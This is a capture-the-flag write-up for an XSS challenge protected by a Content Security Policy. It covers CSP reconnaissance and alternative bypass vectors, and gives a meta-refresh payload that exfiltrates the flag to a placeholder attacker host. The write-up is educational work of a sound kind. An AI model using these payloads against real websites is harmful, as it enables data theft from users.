# XSS4: Medium Level CSP

> **Platform:** SEC4US CTF Lab | **Category:** Web: XSS | **Points:** Dynamic

## Overview

Advanced XSS challenge where a Content Security Policy is in place. The bypass requires using meta-refresh or other CSP-allowed techniques.

---

## Approach

**Technique:** XSS with Content Security Policy Bypass

### Reconnaissance

Examine the CSP headers returned by the application to understand what is allowed and blocked.

```bash
curl -I http://<TARGET_URL>
```

### Exploitation

1. **CSP analysis:** Review the Content-Security-Policy header. Identify allowed sources and directives
2. **Inline script restriction:** Standard `<script>` injection is blocked by CSP
3. **Meta-refresh bypass:** Use `<meta http-equiv="refresh">` to redirect with data exfiltration:
   ```html
   <meta http-equiv="refresh" content="0;url=http://LHOST/?flag=DATA">
   ```
4. **Alternative vectors:** Depending on the CSP policy, consider:
   - `<base>` tag hijacking
   - Allowed CDN script gadgets
   - CSS injection for data exfiltration
   - `<object>` or `<embed>` tags
5. **Flag capture:** Receive the exfiltrated flag on a controlled listener

### Tools Used

Burp Suite, browser, netcat/Python HTTP server, CSP evaluator

---

## Security Frameworks

### MITRE ATT&CK

| Technique | Description |
|-----------|-------------|
| T1059.007 | JavaScript |

### CWE

| ID | Description |
|----|-------------|
| CWE-79 | Cross-site Scripting |
| CWE-1021 | Improper Restriction of Rendered UI Layers |

---

## Author

**Andre Henrike** (@mrhenrike)

CSP is only as strong as its weakest directive. One misconfigured source can unravel the entire policy. Thanks guys!! (❍ᴥ❍ʋ)

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike

---

*For educational purposes only. Do not use any technique shown here against systems you do not own or have explicit permission to test.*
